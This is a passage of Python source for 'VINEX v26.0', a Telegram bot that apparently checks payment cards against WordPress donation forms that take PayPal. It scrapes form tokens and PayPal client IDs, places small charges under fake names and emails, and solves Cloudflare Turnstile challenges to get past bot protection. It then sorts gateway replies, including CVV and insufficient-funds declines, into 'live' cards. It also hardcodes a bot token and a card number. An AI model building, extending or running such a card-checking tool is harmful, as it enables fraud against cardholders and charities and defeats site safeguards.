#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║   VINEX v26.0 — Smart Edition                               ║
# ║   Thinking + Speed + Precision                              ║
# ║   Full field extraction + Gateway that lives 1 week         ║
# ╚══════════════════════════════════════════════════════════════╝
import telebot
from telebot import types
import telebot.apihelper
import time, threading, os, re, json, base64, random
import logging, tempfile, gzip, zlib, codecs, html, binascii
import struct, socket, hashlib, copy
from string import Template
from collections import defaultdict
from urllib.parse import urlparse, unquote, parse_qsl, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import brotli
    _HAS_BROTLI = True
except Exception:
    _HAS_BROTLI = False

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
except Exception:
    def rand_ua(): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'

telebot.apihelper.CONNECT_TIMEOUT = 30
telebot.apihelper.READ_TIMEOUT = 180

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'vinex_results_{}_{}.txt'
LIVE_DIR_TMPL = 'vinex_live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
LINK_COOLDOWN = 30
PROGRESS_SAVE_EVERY = 5
STATUS_UPDATE_EVERY = 2.0
CLEANUP_OLDER_THAN_DAYS = 7

# v26: anti-risk delay between cards/links — 1.0-1.5s
CARD_DELAY_MIN = 1.0
CARD_DELAY_MAX = 1.5

BASE_AMOUNTS = ['1.00', '5.00']
TEST_CARD = os.getenv('TEST_CARD', '4059986126444431|11|30|947')

TS_API_URL = os.getenv('TS_API_URL', '').rstrip('/')
TS_API_KEY = os.getenv('TS_API_KEY', '')

EFFECT_FIRE = '5104841245755180586'
EFFECT_HEART = '5046509860389126442'
EFFECT_CELEBRATE = '5046589136895476101'
EFFECT_THUMBS = '5107584321108051014'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('vinex.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('vinex')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

_STATS_LOCK = threading.Lock()
_PROGRESS_LOCK = threading.Lock()

# ═══════════════════════════════════════════════════════════════
#  LIVE RESPONSES — كل ما ممكن يبقى hit
# ═══════════════════════════════════════════════════════════════
LIVE_RESPONSES = [
    'CHARGE', 'COMPLETED', 'APPROVED', 'success":true', '"success": true',
    'Payer cannot pay for this transaction',
    'INSTRUMENT_DECLINED', 'ORDER_NOT_APPROVED', 'PAYER_ACTION_REQUIRED',
    'PAYER_CANNOT_PAY', 'PAYMENT_DENIED', 'PAYEE_ACCOUNT_RESTRICTED',
    'PAYEE_NOT_CONSENTED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'PERMISSION_DENIED', 'POSTAL_CODE_REQUIRED', 'REFERENCED_CARD_EXPIRED',
    'CARD_EXPIRED', 'AMOUNT_MISMATCH', 'DUPLICATE_INVOICE_ID',
    'INVALID_RESOURCE_ID', 'ITEM_TOTAL_MISMATCH',
    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'ORDER_ALREADY_AUTHORIZED', 'ORDER_ALREADY_CAPTURED',
    'REDIRECT_PAYER_FOR_ALTERNATE_FUNDING', 'VALIDATION_ERROR',
    'UNPROCESSABLE_ENTITY',
    'DO_NOT_HONOR', 'GENERIC_DECLINE', 'CVV2_FAILURE', 'CVV_FAILURE',
    'INSUFFICIENT_FUNDS', 'INVALID_PIN', 'CARD_CLOSED',
    'PICKUP_CARD_SPECIAL_CONDITIONS', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'INVALID_OR_RESTRICTED_CARD', 'SOFT_AVS', 'DUPLICATE_TRANSACTION',
    'INVALID_TRANSACTION', 'EXPIRED_CARD', 'INVALID_DATA_FORMAT',
    'INVALID_AMOUNT', 'INVALID_ACCOUNT', 'INVALID_MERCHANT',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'REVERSAL_REJECTED',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ISSUER_NOT_AVAILABLE_RETRIABLE',
    'AUTHENTICATION_FAILED', 'BIN_ERROR', 'PIN_ERROR',
    'SENDING_LIMIT_EXCEEDED', 'TRANSACTION_RECEIVING_LIMIT_EXCEEDED',
    'CURRENCY_MISMATCH', 'INVALID_ACCOUNT_STATUS',
    'REJECTED_DUE_TO_RISK_REVERSAL', 'TRANSACTION_REFUSED',
    'INTERNAL_SERVER_ERROR', 'INVALID_REQUEST', 'AUTHENTICATION_FAILURE',
    'NOT_AUTHORIZED', 'RESOURCE_NOT_FOUND',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'PAYEE_BLOCKED_TRANSACTION', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
    'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
    'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT', 'DECLINED',
    'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER',
    'TRANSACTION_NOT_PERMITTED', 'SECURITY_VIOLATION',
    'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED_PLEASE_RETRY',
    'For Visa, Mastercard', 'nothing matches',
    'address and postal code are both incorrect',
    'CVV2/CSC does not match',
    'account closed as fraudulent',
    'The requested action could not be performed',
    'Payer has not yet approved the Order',
    'Please redirect the payer',
    'provide a valid payment_source',
]

# ═══════════════════════════════════════════════════════════════
#  FONTS
# ═══════════════════════════════════════════════════════════════
def _bold(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D400 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D41A + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7CE + o - 0x30))
        else: r.append(c)
    return ''.join(r)

def _sb(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D5D4 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D5EE + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7EC + o - 0x30))
        else: r.append(c)
    return ''.join(r)

B = _bold
SB = _sb

VINEX_CE = {
    'warn':       ('5420323339723881652', '⚠️'),
    'globe':      ('5447410659077661506', '🌐'),
    'play':       ('5264919878082509254', '▶️'),
    'ban':        ('5240241223632954241', '🚫'),
    'sound':      ('5388632425314140043', '🔊'),
    'party':      ('6039789659691688114', '🎉'),
    'cash':       ('5197434882321567830', '💵'),
    'smile':      ('6150116924165461974', '😊'),
    'moneybag':   ('6125337376639161874', '💰'),
    'laugh':      ('5352615886131831104', '😆'),
    'gear':       ('5929098607192969118', '⚙'),
    'circle':     ('5933844889652432294', '⚪'),
    'stop':       ('5260293700088511294', '⛔'),
    'scream':     ('5222466772061436244', '😱'),
    'gift':       ('6026316531967726726', '🎁'),
    'record':     ('6026056450223116307', '⏺'),
    'moneywings': ('5231449120635370684', '💸'),
    'shop':       ('5229064374403998351', '🛍'),
    'soon':       ('5440621591387980068', '🔜'),
    'pause':      ('5359543311897998264', '⏸'),
    'shield':     ('5197288647275071607', '🛡'),
    'money2':     ('6122682287986317242', '💸'),
    'grimace':    ('6125216237086579378', '😬'),
    'blue_bolt':  ('5836917983271722591', '🔵'),
    'rocket':     ('5836917983271722591', '🚀'),
}

def ve(name):
    if name not in VINEX_CE: return ''
    cid, fb = VINEX_CE[name]
    return f'<tg-emoji emoji-id="{cid}">{fb}</tg-emoji>'

def vt(label, value):
    return f'[⚡] {B(label)}: {value}'

def vsep():
    return '- ' * 22

def vinex_btn(label, style='primary', emoji_name=None, **kwargs):
    kw = dict(kwargs)
    if style in ('success', 'primary', 'danger'):
        kw['style'] = style
    if emoji_name and emoji_name in VINEX_CE:
        kw['icon_custom_emoji_id'] = VINEX_CE[emoji_name][0]
    try:
        return types.InlineKeyboardButton(text=label, **kw)
    except TypeError:
        kw.pop('style', None)
        kw.pop('icon_custom_emoji_id', None)
        return types.InlineKeyboardButton(text=label, **kw)

def vinex_header(subtitle=''):
    lines = [
        '╔══════════════════════════╗',
        f'║  {ve("party")} <b>VINEX</b> {ve("party")}  ║',
        f'║  <i>Scanner v26.0</i>  ║',
        '╚══════════════════════════╝',
    ]
    if subtitle:
        lines.append(f'<b>▸ {subtitle}</b>')
    return '\n'.join(lines)

def playful(kind):
    pool = {
        'start':   ['🚀', '🎯', '⚡', '🔥'],
        'working': ['⚙️', '🔄', '🧠', '⚡', '🌀'],
        'success': ['🎉', '✨', '💫', '🎊', '🏆'],
        'dead':    ['💀', '😴', '🥀', '❌'],
        'live':    ['💎', '💚', '💛', '🏆'],
        'error':   ['⚠️', '🚨', '💢'],
        'fun':     ['😎', '🤙', '👑', '🦾', '😏'],
    }
    return random.choice(pool.get(kind, ['•']))

# ═══════════════════════════════════════════════════════════════
#  TURNSTILE SOLVER
# ═══════════════════════════════════════════════════════════════
class TurnstileSolver:
    def __init__(self):
        self.api_url = TS_API_URL
        self.api_key = TS_API_KEY
        self.enabled = bool(self.api_url and self.api_key)

    def solve(self, page_url, sitekey, timeout=90):
        if not self.enabled: return None
        try:
            r = requests.post(
                f'{self.api_url}/turnstile',
                headers={'x-api-key': self.api_key, 'Content-Type': 'application/json'},
                json={'url': page_url, 'sitekey': sitekey}, timeout=20)
            if r.status_code != 200: return None
            tid = r.json().get('task_id')
            if not tid: return None
            end = time.time() + timeout
            while time.time() < end:
                r = requests.get(f'{self.api_url}/result/{tid}',
                    headers={'x-api-key': self.api_key}, timeout=20)
                if r.status_code == 202:
                    time.sleep(2); continue
                if r.status_code == 200:
                    token = r.json().get('token')
                    if token: return token
                return None
        except Exception: return None

_turnstile = TurnstileSolver()

# ═══════════════════════════════════════════════════════════════
#  STATE + FILES
# ═══════════════════════════════════════════════════════════════
waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
mass_shared = {}
user_last_paypal = defaultdict(float)
user_last_mass = defaultdict(float)
link_cooldowns = {}

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w', encoding='utf-8').close()
    except: pass

def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f: f.write(f'{uid}\n')
    except: pass

def is_blocked(uid):
    try:
        return str(uid) in [l.strip() for l in open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines() if l.strip()]
    except: return False

def load_stats():
    try:
        with _STATS_LOCK: return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except: return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(st):
    try:
        with _STATS_LOCK: json.dump(st, open(STATS_FILE, 'w', encoding='utf-8'))
    except: pass

def bump_stat(k):
    try:
        s = load_stats(); s[k] = s.get(k, 0) + 1; save_stats(s)
    except: pass

def save_progress(uid, data):
    try:
        with _PROGRESS_LOCK:
            fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
            with os.fdopen(fd, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False)
            os.replace(tmp, PROGRESS_TMPL.format(uid))
    except: pass

def load_progress(uid):
    try:
        with _PROGRESS_LOCK:
            p = PROGRESS_TMPL.format(uid)
            if not os.path.exists(p): return None
            d = json.load(open(p, 'r', encoding='utf-8'))
            if not isinstance(d, dict): return None
            if not isinstance(d.get('links'), list) or not d['links']: return None
            d.setdefault('processed', 0); d.setdefault('live', 0); d.setdefault('dead', 0)
            d.setdefault('total', len(d['links'])); d.setdefault('started_at', time.time())
            return d
    except: return None

def clear_progress(uid):
    try:
        with _PROGRESS_LOCK: os.remove(PROGRESS_TMPL.format(uid))
    except: pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for n in os.listdir('.'):
            if n.startswith(('vinex_results_', 'vinex_live_')):
                p = os.path.join('.', n)
                if os.path.isfile(p) and os.path.getmtime(p) < cutoff: os.remove(p)
    except: pass

# ═══════════════════════════════════════════════════════════════
#  URL + DEDUP
# ═══════════════════════════════════════════════════════════════
_URL_RE = re.compile(r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$')

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"': link = link[:-1]
        if len(link) < 8: return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low: return None
        if not link.startswith(('http://', 'https://')): link = 'https://' + link.lstrip('/')
        p = urlparse(link)
        if not p.netloc or not p.netloc.strip(): return None
        host = p.netloc.split(':')[0].split('@')[-1].rstrip('.')
        if not host or not _URL_RE.match(host):
            if not host.startswith('xn--') and 'xn--' not in host: return None
        return link
    except: return None

def normalize_url_key(url):
    try:
        if not url: return ''
        p = urlparse(url.lower().strip())
        host = p.netloc.replace('www.', '').rstrip('.')
        path = p.path.rstrip('/') or '/'
        q = p.query.strip()
        return f'{host}{path}?{q}' if q else f'{host}{path}'
    except: return str(url).lower().strip()

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════════
def retry_call(func, *args, retries=4, delays=(2, 4, 8, 16), **kw):
    last = None
    for i in range(retries):
        try: return func(*args, **kw)
        except Exception as e:
            last = e
            err = str(e).lower()
            if any(x in err for x in ('invalid file_id', 'file is too big', 'wrong file_id', 'not found')): raise
            if i < retries - 1: time.sleep(delays[i] if i < len(delays) else delays[-1])
    raise last

def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML', effect=None):
    for i in range(retries):
        try:
            kw = {'chat_id': cid, 'text': text, 'parse_mode': parse_mode,
                  'reply_markup': reply_markup, 'disable_web_page_preview': True}
            if effect:
                try: kw['message_effect_id'] = effect
                except: pass
            return bot.send_message(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if 'effect' in err.lower() or 'unknown field' in err.lower():
                kw.pop('message_effect_id', None)
                try: return bot.send_message(**kw)
                except: pass
            if "can't parse" in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(cid, re.sub(r'<[^>]+>', '', text)[:4000],
                                            reply_markup=reply_markup, disable_web_page_preview=True)
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=cid, message_id=mid, text=text,
                                          parse_mode='HTML', disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if 'not modified' in err: return None
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if "can't parse" in err.lower():
                try:
                    return bot.edit_message_text(chat_id=cid, message_id=mid,
                                                  text=re.sub(r'<[^>]+>', '', text)[:4000])
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_send_document(cid, path, caption='', retries=3):
    try:
        if not os.path.exists(path): return None
    except: return None
    for attempt in range(3):
        try:
            with open(path, 'rb') as f:
                kw = {'chat_id': cid, 'document': f, 'timeout': 180}
                if attempt == 0:
                    kw['caption'] = caption; kw['parse_mode'] = 'HTML'
                elif attempt == 1:
                    kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                return bot.send_document(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            continue
    return None

def react_to(message, emoji='👍'):
    try:
        bot.set_message_reaction(chat_id=message.chat.id, message_id=message.message_id,
                                  reaction=[{'type': 'emoji', 'emoji': emoji}], is_big=False)
        return True
    except: return False

def show_typing(cid, action='typing', duration=2.0):
    try:
        bot.send_chat_action(cid, action)
        def r():
            try:
                end = time.time() + duration
                while time.time() < end:
                    time.sleep(4)
                    if time.time() < end: bot.send_chat_action(cid, action)
            except: pass
        threading.Thread(target=r, daemon=True).start()
    except: pass

def send_dice(cid, emoji='🎲'):
    try: return bot.send_dice(cid, emoji=emoji)
    except: return None

# ═══════════════════════════════════════════════════════════════
#  RESPONSE EXTRACTOR
# ═══════════════════════════════════════════════════════════════
def extract_response_text(body):
    if not body: return ''
    s = str(body).strip()
    if not s: return ''
    try: j = json.loads(s)
    except: j = None

    def _find(obj, depth=0):
        if depth > 4 or obj is None: return None
        if isinstance(obj, str):
            if obj.strip().lower() in ('none', 'null', 'false', ''): return None
            return obj[:300]
        if isinstance(obj, (int, float)): return str(obj)[:300]
        if isinstance(obj, list):
            for i in obj:
                r = _find(i, depth + 1)
                if r: return r
            return None
        if isinstance(obj, dict):
            det = obj.get('details')
            if isinstance(det, list) and det:
                for x in det:
                    if isinstance(x, dict):
                        for k in ('description', 'issue', 'reason', 'message'):
                            v = x.get(k)
                            if v and str(v).strip().lower() not in ('none', 'null', ''): return str(v)[:300]
            for k in ('description', 'message', 'error_description', 'error', 'msg', 'reason', 'detail', 'status'):
                if k in obj:
                    v = obj[k]
                    if isinstance(v, dict):
                        r = _find(v, depth + 1)
                        if r: return r
                    elif v and str(v).strip().lower() not in ('none', 'null', 'false', ''):
                        return str(v)[:300]
            if 'data' in obj:
                r = _find(obj['data'], depth + 1)
                if r: return r
            if 'name' in obj and isinstance(obj['name'], str):
                n = obj['name']
                if n.upper() not in ('UNPROCESSABLE_ENTITY', 'INVALID_REQUEST', 'VALIDATION_ERROR'): return n[:300]
        return None

    if j is not None:
        r = _find(j)
        if r: return r
    return s[:300]

# ═══════════════════════════════════════════════════════════════
#  CLASSIFICATION
# ═══════════════════════════════════════════════════════════════
def is_live_response(r):
    if not r: return False
    up = str(r).upper()
    for kw in LIVE_RESPONSES:
        if kw.upper() in up: return True
    return False

def normalize_result(r):
    if not r: return 'DECLINED'
    s = str(r)
    up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    return s[:250]

PRIORITY = [
    ('CHARGE', 200), ('COMPLETED', 205), ('APPROVED', 195),
    ('INSUFFICIENT_FUNDS', 190), ('INVALID_OR_RESTRICTED_CARD', 188),
    ('TRANSACTION_NOT_PERMITTED', 186), ('Payer cannot pay', 185),
    ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('INSTRUMENT_DECLINED', 182), ('PAYMENT_DENIED', 180),
    ('SUSPECTED_FRAUD', 178), ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175),
    ('EXPIRED_CARD', 172), ('DO_NOT_HONOR', 170),
    ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168), ('ACCOUNT_CLOSED', 166),
    ('LOST_OR_STOLEN', 164), ('GENERIC_DECLINE', 155),
    ('TRANSACTION_REFUSED', 153), ('DECLINED', 100),
]

def score_result(r):
    if not r: return 0
    up = str(r).upper()
    for k, s in PRIORITY:
        if k.upper() in up: return s
    return 1

# ═══════════════════════════════════════════════════════════════
#  CURRENCY MAP
# ═══════════════════════════════════════════════════════════════
SYMBOL_TO_CURRENCY = {
    '$': 'USD', '€': 'EUR', '£': 'GBP', '¥': 'JPY', '₹': 'INR',
    'C$': 'CAD', 'A$': 'AUD', 'R$': 'BRL', '₽': 'RUB', '₩': 'KRW',
    'CHF': 'CHF', 'kr': 'SEK', 'zł': 'PLN', '₺': 'TRY', '₪': 'ILS',
    'د.إ': 'AED', 'ر.س': 'SAR', 'E£': 'EGP', 'DH': 'MAD',
}
# ═══════════════════════════════════════════════════════════════
#  VINEX TESTER v26.0 — Smart Edition
# ═══════════════════════════════════════════════════════════════
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David',
               'Daniel', 'Matthew', 'Christopher', 'Andrew']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller',
              'Davis', 'Garcia', 'Rodriguez', 'Wilson']

_HOST_CACHE = {}
_HOST_CACHE_LOCK = threading.Lock()

def _host_cache_get(host):
    with _HOST_CACHE_LOCK: return _HOST_CACHE.get(host, {})

def _host_cache_set(host, key, val, ttl=300):
    with _HOST_CACHE_LOCK:
        if host not in _HOST_CACHE: _HOST_CACHE[host] = {}
        _HOST_CACHE[host][key] = {'v': val, 't': time.time() + ttl}

def _host_cache_valid(host, key):
    with _HOST_CACHE_LOCK:
        c = _HOST_CACHE.get(host, {}).get(key)
        if not c: return None
        if time.time() > c['t']: return None
        return c['v']


class VinexTester:
    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query: self.inurl += '?' + p.query
        except Exception:
            self.url = 'invalid.local'; self.inurl = '/'

        self.paypal = None
        self.client_id = None
        self.client_secret = None
        self.donation = '5.00'
        self.minimum = '5.00'
        self.currency = 'USD'
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonce = None
        self.wp_nonce = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.page_html = ''
        self.all_content = ''
        self.auth_method = 'none'
        self.gateway_type = 'unknown'
        self.form_fields = {}
        self.form_steps = []
        self.terms_fields = []
        self.buttons = []
        self.hidden_fields = {}
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100, 999)}@gmail.com'
        self.r = requests.Session(); self.r.verify = False
        self.r.headers.update({
            'user-agent': rand_ua(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False
        self.cf_detected = False
        self.cf_sitekey = None
        self.cf_solved = False
        self.tier_used = None
        self.last_order_id = None
        self.last_order_status = None
        self.last_capture_id = None
        self.attempt_log = []
        self._nonce_ts = 0
        self._token_ts = 0
        self.capture_config = {}

        cached_tok = _host_cache_valid(self.url, 'au')
        cached_nonce = _host_cache_valid(self.url, 'nonce')
        cached_cid = _host_cache_valid(self.url, 'client_id')
        cached_form2 = _host_cache_valid(self.url, 'id_form2')
        cached_form1 = _host_cache_valid(self.url, 'id_form1')
        cached_ajax = _host_cache_valid(self.url, 'ajax_url')
        cached_pp = _host_cache_valid(self.url, 'paypal')
        if cached_tok: self.au = cached_tok; self._token_ts = time.time()
        if cached_nonce: self.nonce = cached_nonce; self._nonce_ts = time.time()
        if cached_cid: self.client_id = cached_cid
        if cached_form2: self.id_form2 = cached_form2
        if cached_form1: self.id_form1 = cached_form1
        if cached_ajax: self.ajax_url = cached_ajax
        if cached_pp: self.paypal = cached_pp

    def _log(self, m):
        try: self.diagnostics.append(f'{time.time():.2f} {m}')
        except Exception: pass

    def _save_cache(self):
        try:
            if self.au: _host_cache_set(self.url, 'au', self.au, ttl=3600)
            if self.nonce: _host_cache_set(self.url, 'nonce', self.nonce, ttl=600)
            if self.client_id: _host_cache_set(self.url, 'client_id', self.client_id)
            if self.id_form2: _host_cache_set(self.url, 'id_form2', self.id_form2)
            if self.id_form1: _host_cache_set(self.url, 'id_form1', self.id_form1)
            if self.ajax_url: _host_cache_set(self.url, 'ajax_url', self.ajax_url)
            if self.paypal: _host_cache_set(self.url, 'paypal', self.paypal)
        except Exception: pass

    def _safe_get(self, url, timeout=10, headers=None):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            return self.r.get(url, timeout=timeout, headers=headers or {})
        except Exception: return None

    def _safe_post(self, url, **kwargs):
        try:
            if not url or not isinstance(url, str): return None
            return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
        except Exception: return None

    def _build_url(self, base, path):
        try:
            if not base or not path: return None
            if path.startswith('//'): return 'https:' + path
            if path.startswith('/'): return f'https://{base}{path}'
            if not path.startswith('http'): return f'https://{base}/{path}'
            return path
        except Exception: return None

    # ─── Cloudflare ───
    def _detect_cloudflare(self):
        try:
            c = (self.all_content or '') + '\n' + (self.page_html or '')
            markers = ['challenges.cloudflare.com', 'cf-turnstile', 'turnstile.render',
                       'cf-chl-widget', '_cf_chl_opt', 'cf-challenge', 'data-sitekey']
            if not any(m in c for m in markers): return False
            for pat in [
                r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'sitekey["\']?\s*[:=]\s*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'["\'](0x4AAAAAA[A-Za-z0-9_-]{10,})["\']',
            ]:
                m = re.search(pat, c)
                if m: self.cf_sitekey = m.group(1); break
            return True
        except Exception: return False

    def _solve_cloudflare(self):
        if not self.cf_detected or not _turnstile.enabled or not self.cf_sitekey: return False
        token = _turnstile.solve(self.page_url, self.cf_sitekey)
        if not token: return False
        try:
            self.r.cookies.set('cf_clearance', token, domain=self.url)
            self.cf_solved = True
            return True
        except Exception: return False

    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(self.page_url, timeout=12)
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text
                    self.all_content = r.text
                    return True
            except Exception: pass
            time.sleep(0.2)
        return False

    # ─── PARALLEL EXTRACTION (16 workers) ───
    def _parallel_extract(self):
        if not self.page_html: return
        tasks = []

        for m in re.finditer(r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout)[^"\']*)["\']',
                             self.page_html, re.I):
            full = self._build_url(self.url, m.group(1))
            if full: tasks.append(full)

        js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
        prio = [u for u in js_urls if any(k in u.lower() for k in
                ('give', 'donation', 'paypal', 'commerce', 'token', 'client'))]
        for u in (prio[:10] + [x for x in js_urls if x not in prio][:10]):
            full = self._build_url(self.url, u)
            if full: tasks.append(full)

        for ep in ['/wp-json/', '/wp-json/give-api/v1/forms', '/wp-json/wp/v2/types',
                   '/sw.js', '/service-worker.js', '/manifest.json',
                   '/robots.txt', '/sitemap.xml', '/.well-known/security.txt']:
            tasks.append(f'https://{self.url}{ep}')

        def _fetch(u):
            try:
                r = self.r.get(u, timeout=6)
                if r and r.status_code == 200 and r.text:
                    return r.text[:200000]
            except Exception: pass
            return None

        results = []
        try:
            with ThreadPoolExecutor(max_workers=16) as pool:
                futures = [pool.submit(_fetch, t) for t in tasks[:40]]
                for f in as_completed(futures, timeout=28):
                    try:
                        t = f.result(timeout=2)
                        if t: results.append(t)
                    except Exception: continue
        except Exception: pass

        for t in results:
            try: self.all_content += '\n' + t
            except Exception: pass

    # ─── FULL FORM EXTRACTION ───
    def _extract_full_form(self):
        """استخراج كل حاجة من الفورم: fields, steps, terms, buttons, hidden"""
        try:
            c = self.all_content
            if not c: return

            # ID form1
            for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                      r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
                      r'data-form-id-prefix=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m: self.id_form1 = m.group(1); break

            # ID form2
            for p in [r'name="give-form-id"\s+value="(\d+)"',
                      r'"give-form-id"\s*:\s*"?(\d+)"?',
                      r'data-form-id=["\'](\d+)["\']',
                      r'give-form-(\d+)-']:
                m = re.search(p, c)
                if m: self.id_form2 = m.group(1); break

            # nonce
            if not self.nonce:
                for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                          r'"give-form-hash"\s*:\s*"([^"]+)"',
                          r'"nonce"\s*:\s*"([a-f0-9]{8,32})"',
                          r'name="_wpnonce"\s+value="([^"]+)"']:
                    m = re.search(p, c)
                    if m: self.nonce = m.group(1); self._nonce_ts = time.time(); break

            # minimum — 6 sources
            for p in [r'name="give-form-minimum"\s+value="([^"]*)"',
                      r'"give-form-minimum"\s*:\s*"([^"]*)"',
                      r'"minimum_price"\s*:\s*"?([\d.]+)"?',
                      r'"minimum"\s*:\s*"?([\d.]+)"?',
                      r'"min_amount"\s*:\s*"?([\d.]+)"?',
                      r'data-minimum=["\']([\d.]+)["\']']:
                m = re.search(p, c)
                if m and m.group(1).strip():
                    self.minimum = m.group(1).strip(); break

            # currency — 10 sources
            for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"',
                      r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                      r'"currency"\s*:\s*"([A-Za-z]{3})"',
